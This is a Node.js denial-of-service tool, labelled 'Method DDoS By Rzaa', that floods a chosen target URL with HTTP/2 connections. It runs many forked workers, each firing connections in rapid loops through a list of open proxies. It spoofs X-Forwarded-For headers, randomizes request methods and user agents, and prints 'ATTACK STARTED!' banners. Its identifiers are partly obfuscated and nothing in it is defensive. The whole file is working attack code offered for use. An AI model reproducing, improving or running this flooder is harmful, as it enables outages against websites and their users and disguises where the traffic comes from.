const net = require("net"),
  http2 = require("http2"),
  tls = require("tls"),
  cluster = require("cluster"),
  url = require("url"),
  crypto = require("crypto"),
  fs = require("fs");
lang_header = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9", "de-CH;q=0.7", "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5", "en-US,en;q=0.9", "en-GB,en;q=0.9", "en-CA,en;q=0.9", "en-AU,en;q=0.9", "en-NZ,en;q=0.9", "en-ZA,en;q=0.9", "en-IE,en;q=0.9", "en-IN,en;q=0.9", "ar-SA,ar;q=0.9", "az-Latn-AZ,az;q=0.9", "be-BY,be;q=0.9", "bg-BG,bg;q=0.9", "bn-IN,bn;q=0.9", "ca-ES,ca;q=0.9", "cs-CZ,cs;q=0.9", "cy-GB,cy;q=0.9", "da-DK,da;q=0.9", "de-DE,de;q=0.9", "el-GR,el;q=0.9", "es-ES,es;q=0.9", "et-EE,et;q=0.9", "eu-ES,eu;q=0.9", "fa-IR,fa;q=0.9", "fi-FI,fi;q=0.9", "fr-FR,fr;q=0.9", "ga-IE,ga;q=0.9", "gl-ES,gl;q=0.9", "gu-IN,gu;q=0.9", "he-IL,he;q=0.9", "hi-IN,hi;q=0.9", "hr-HR,hr;q=0.9", "hu-HU,hu;q=0.9", "hy-AM,hy;q=0.9", "id-ID,id;q=0.9", "is-IS,is;q=0.9", "it-IT,it;q=0.9", "ja-JP,ja;q=0.9", "ka-GE,ka;q=0.9", "kk-KZ,kk;q=0.9", "km-KH,km;q=0.9", "kn-IN,kn;q=0.9", "ko-KR,ko;q=0.9", "ky-KG,ky;q=0.9", "lo-LA,lo;q=0.9", "lt-LT,lt;q=0.9", "lv-LV,lv;q=0.9", "mk-MK,mk;q=0.9", "ml-IN,ml;q=0.9", "mn-MN,mn;q=0.9", "mr-IN,mr;q=0.9", "ms-MY,ms;q=0.9", "mt-MT,mt;q=0.9", "my-MM,my;q=0.9", "nb-NO,nb;q=0.9", "ne-NP,ne;q=0.9", "nl-NL,nl;q=0.9", "nn-NO,nn;q=0.9", "or-IN,or;q=0.9", "pa-IN,pa;q=0.9", "pl-PL,pl;q=0.9", "pt-BR,pt;q=0.9", "pt-PT,pt;q=0.9", "ro-RO,ro;q=0.9", "ru-RU,ru;q=0.9", "si-LK,si;q=0.9", "sk-SK,sk;q=0.9", "sl-SI,sl;q=0.9", "sq-AL,sq;q=0.9", "sr-Cyrl-RS,sr;q=0.9", "sr-Latn-RS,sr;q=0.9", "sv-SE,sv;q=0.9", "sw-KE,sw;q=0.9", "ta-IN,ta;q=0.9", "te-IN,te;q=0.9", "th-TH,th;q=0.9", "tr-TR,tr;q=0.9", "uk-UA,uk;q=0.9", "ur-PK,ur;q=0.9", "uz-Latn-UZ,uz;q=0.9", "vi-VN,vi;q=0.9", "zh-CN,zh;q=0.9", "zh-HK,zh;q=0.9", "zh-TW,zh;q=0.9", "am-ET,am;q=0.8", "as-IN,as;q=0.8", "az-Cyrl-AZ,az;q=0.8", "bn-BD,bn;q=0.8", "bs-Cyrl-BA,bs;q=0.8", "bs-Latn-BA,bs;q=0.8", "dz-BT,dz;q=0.8", "fil-PH,fil;q=0.8", "fr-CA,fr;q=0.8", "fr-CH,fr;q=0.8", "fr-BE,fr;q=0.8", "fr-LU,fr;q=0.8", "gsw-CH,gsw;q=0.8", "ha-Latn-NG,ha;q=0.8", "hr-BA,hr;q=0.8", "ig-NG,ig;q=0.8", "ii-CN,ii;q=0.8", "is-IS,is;q=0.8", "jv-Latn-ID,jv;q=0.8", "ka-GE,ka;q=0.8", "kkj-CM,kkj;q=0.8", "kl-GL,kl;q=0.8", "km-KH,km;q=0.8", "kok-IN,kok;q=0.8", "ks-Arab-IN,ks;q=0.8", "lb-LU,lb;q=0.8", "ln-CG,ln;q=0.8", "mn-Mong-CN,mn;q=0.8", "mr-MN,mr;q=0.8", "ms-BN,ms;q=0.8", "mt-MT,mt;q=0.8", "mua-CM,mua;q=0.8", "nds-DE,nds;q=0.8", "ne-IN,ne;q=0.8", "nso-ZA,nso;q=0.8", "oc-FR,oc;q=0.8", "pa-Arab-PK,pa;q=0.8", "ps-AF,ps;q=0.8", "quz-BO,quz;q=0.8", "quz-EC,quz;q=0.8", "quz-PE,quz;q=0.8", "rm-CH,rm;q=0.8", "rw-RW,rw;q=0.8", "sd-Arab-PK,sd;q=0.8", "se-NO,se;q=0.8", "si-LK,si;q=0.8", "smn-FI,smn;q=0.8", "sms-FI,sms;q=0.8", "syr-SY,syr;q=0.8", "tg-Cyrl-TJ,tg;q=0.8", "ti-ER,ti;q=0.8", "te;q=0.9,en-US;q=0.8,en;q=0.7", "tk-TM,tk;q=0.8", "tn-ZA,tn;q=0.8", "tt-RU,tt;q=0.8", "ug-CN,ug;q=0.8", "uz-Cyrl-UZ,uz;q=0.8", "ve-ZA,ve;q=0.8", "wo-SN,wo;q=0.8", "xh-ZA,xh;q=0.8", "yo-NG,yo;q=0.8", "zgh-MA,zgh;q=0.8", "zu-ZA,zu;q=0.8"];
encoding_header = ["gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity", "*"];
const Methods = ["GET", "HEAD", "POST", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"],
  lintarMethod = Methods[Math.floor(Math.random() * Methods.length)];
function getRandomUserAgent() {
  const _0xbfa4b6 = ["Windows NT 10.0", "Windows NT 6.1", "Windows NT 6.3", "Macintosh", "Android", "Linux"],
    _0x1da1b9 = ["Chrome", "Firefox", "Safari", "Edge", "Opera"],
    _0x1598c9 = ["en-US", "en-GB", "fr-FR", "de-DE", "es-ES"];
  const _0x493620 = ["US", "GB", "FR", "DE", "ES", "UK", "BR"],
    _0x1b2753 = ["Apple", "Google", "Microsoft", "Mozilla", "Opera Software"],
    _0x3c616a = _0xbfa4b6[Math.floor(Math.random() * _0xbfa4b6.length)],
    _0x477fbd = _0x1da1b9[Math.floor(Math.random() * _0x1da1b9.length)];
  const _0x5644df = _0x1598c9[Math.floor(Math.random() * _0x1598c9.length)];
  const _0x298a5e = _0x493620[Math.floor(Math.random() * _0x493620.length)],
    _0x5d7c01 = _0x1b2753[Math.floor(Math.random() * _0x1b2753.length)];
  const _0x426ecd = Math.floor(Math.random() * 100) + 1,
    _0x1ec534 = Math.floor(Math.random() * 6) + 1,
    _0x57df67 = _0x5d7c01 + "/" + _0x477fbd + " " + _0x426ecd + "." + _0x426ecd + "." + _0x426ecd + " (" + _0x3c616a + "; " + _0x298a5e + "; " + _0x5644df + ")",
    _0x2596a1 = btoa(_0x57df67);
  let _0x18e60f = "";
  for (let _0x3482b3 = 0; _0x3482b3 < _0x2596a1.length; _0x3482b3++) {
    _0x3482b3 % _0x1ec534 === 0 ? _0x18e60f += _0x2596a1.charAt(_0x3482b3) : _0x18e60f += _0x2596a1.charAt(_0x3482b3).toUpperCase();
  }
  return _0x18e60f;
}
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.argv.length < 7 && (console.log("Method DDoS By Rzaa\n Usage: node Tenzu.js target time rate thread proxy.txt"), process.exit());
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":"),
  ciphers = "GREASE:" + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], ...defaultCiphers.slice(3)].join(":"),
  sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
  ecdhCurve = "GREASE:x25519:secp256r1:secp384r1",
  secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION,
  secureProtocol = "TLS_client_method",
  headers = {},
  _0x191e1d = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
  };
const secureContext = tls.createSecureContext(_0x191e1d);
var proxyFile = "proxy.txt",
  proxies = readLines(proxyFile),
  userAgents = readLines("ua.txt");
const _0x20940c = {
  target: process.argv[2],
  time: ~~process.argv[3],
  Rate: ~~process.argv[4],
  threads: ~~process.argv[5]
};
const parsedTarget = url.parse(_0x20940c.target);
if (cluster.isMaster) {
  for (let counter = 1; counter <= _0x20940c.threads; counter++) {
    cluster.fork();
  }
} else {
  for (let i = 0; i < 120; i++) {
    setInterval(runFlooder, 0);
  }
}
class NetSocket {
  constructor() {}
  HTTP(_0x31993c, _0x1242b4) {
    const _0x21d18e = "CONNECT " + _0x31993c.address + ":443 HTTP/1.1\r\nHost: " + _0x31993c.address + ":443\r\nConnection: Keep-Alive\r\n\r\n",
      _0x4e9137 = new Buffer.from(_0x21d18e),
      _0x2328fe = {
        host: _0x31993c.host,
        port: _0x31993c.port,
        allowHalfOpen: true,
        writable: true,
        readable: true
      };
    const _0x11be8c = net.connect(_0x2328fe);
    _0x11be8c.setTimeout(_0x31993c.timeout * 100000);
    _0x11be8c.setKeepAlive(true, 100000);
    _0x11be8c.setNoDelay(true);
    _0x11be8c.on("connect", () => {
      _0x11be8c.write(_0x4e9137);
    });
    _0x11be8c.on("data", _0x2ca13f => {
      const _0x340bc7 = _0x2ca13f.toString("utf-8"),
        _0x107100 = _0x340bc7.includes("HTTP/1.1 200");
      if (_0x107100 === false) {
        _0x11be8c.destroy();
        return _0x1242b4(undefined, "error: invalid response from proxy server");
      }
      return _0x1242b4(_0x11be8c, undefined);
    });
    _0x11be8c.on("timeout", () => {
      _0x11be8c.destroy();
      return _0x1242b4(undefined, "error: timeout exceeded");
    });
    _0x11be8c.on("error", _0x583a4d => {
      _0x11be8c.destroy();
      return _0x1242b4(undefined, "error: " + _0x583a4d);
    });
  }
}
const Socker = new NetSocket();
function readLines(_0x4f2c03) {
  return fs.readFileSync(_0x4f2c03, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(_0x509065, _0xf218ec) {
  return Math.floor(Math.random() * (_0xf218ec - _0x509065) + _0x509065);
}
function randomElement(_0x2bbe72) {
  return _0x2bbe72[randomIntn(0, _0x2bbe72.length)];
}
function randomCharacters(_0x2e43a0) {
  output = "";
  for (let _0x1404c1 = 0; _0x1404c1 < _0x2e43a0; _0x1404c1++) {
    output += randomElement(characters);
  }
  return output;
}
headers[":method"] = lintarMethod;
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers.accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
headers["accept-language"] = "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3";
headers["accept-encoding"] = "gzip, deflate, br";
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = "same-origin";
headers["upgrade-insecure-requests"] = "1";
function runFlooder() {
  const _0x159483 = randomElement(proxies);
  const _0x2d7292 = _0x159483.split(":");
  headers[":authority"] = parsedTarget.host;
  headers["user-agent"] = randomElement(userAgents);
  headers["x-forwarded-for"] = _0x2d7292[0];
  const _0x2bf32c = {
    host: _0x2d7292[0],
    port: ~~_0x2d7292[1],
    address: parsedTarget.host + ":443",
    timeout: 15
  };
  Socker.HTTP(_0x2bf32c, (_0x56e521, _0x5915b3) => {
    if (_0x5915b3) {
      return;
    }
    _0x56e521.setKeepAlive(true, 600000);
    _0x56e521.setNoDelay(true);
    const _0x4f2202 = {
      enablePush: false,
      initialWindowSize: 1073741823
    };
    const _0x6f1338 = {
      port: 443,
      secure: true,
      ALPNProtocols: ["h2"],
      ciphers: ciphers,
      sigalgs: sigalgs,
      requestCert: true,
      socket: _0x56e521,
      ecdhCurve: ecdhCurve,
      honorCipherOrder: false,
      host: parsedTarget.host,
      rejectUnauthorized: false,
      clientCertEngine: "dynamic",
      secureOptions: secureOptions,
      secureContext: secureContext,
      servername: parsedTarget.host,
      secureProtocol: secureProtocol
    };
    const _0x58fb30 = tls.connect(443, parsedTarget.host, _0x6f1338);
    _0x58fb30.allowHalfOpen = true;
    _0x58fb30.setNoDelay(true);
    _0x58fb30.setKeepAlive(true, 60000);
    _0x58fb30.setMaxListeners(0);
    const _0x363bde = {
      protocol: "https:",
      settings: _0x4f2202,
      maxSessionMemory: 655000,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => _0x58fb30
    };
    const _0x903718 = http2.connect(parsedTarget.href, _0x363bde);
    _0x903718.setMaxListeners(0);
    _0x903718.settings(_0x4f2202);
    _0x903718.on("connect", () => {});
    _0x903718.on("close", () => {
      _0x903718.destroy();
      _0x56e521.destroy();
      return;
    });
    _0x903718.on("error", _0x2e4d22 => {
      _0x903718.destroy();
      _0x56e521.destroy();
      return;
    });
  });
}
const Script = () => process.exit(1);
setTimeout(Script, _0x20940c.time * 1000);
console.clear();
console.log("%cATTACK STARTED!", "color: red; font-size: 35px;");
console.log("--------------------------------------------");
console.log("Target: " + process.argv[2]);
console.log("Time: " + process.argv[3]);
console.log("Rate: " + process.argv[4]);
console.log("Thread:" + process.argv[5]);
console.log("Methods: SHURE");
console.log("Methods DDoS By :  RZAMODS");
console.log("--------------------------------------------");
process.on("uncaughtException", _0x45ebcd => {});
process.on("unhandledRejection", _0x3b220b => {});
const KillScript = () => process.exit(1);
console.clear();
console.log(`ATTACK LAUNCHED!!`);
console.log(`--------------------------------------------`);
console.log(`Target: ` + process.argv[2]);
console.log(`Time: ` + process.argv[3]);
console.log(`Rate: ` + process.argv[4]);
console.log(`Thread:` + process.argv[5]);
console.log(`Proxy:` + process.argv[6]);
console.log(`Methods: Rzaa`);
console.log(`Methods DDoS By ./SkyzeRzaa`);
console.log(`--------------------------------------------`);
setTimeout(KillScript, _0x20940c.time * 1000);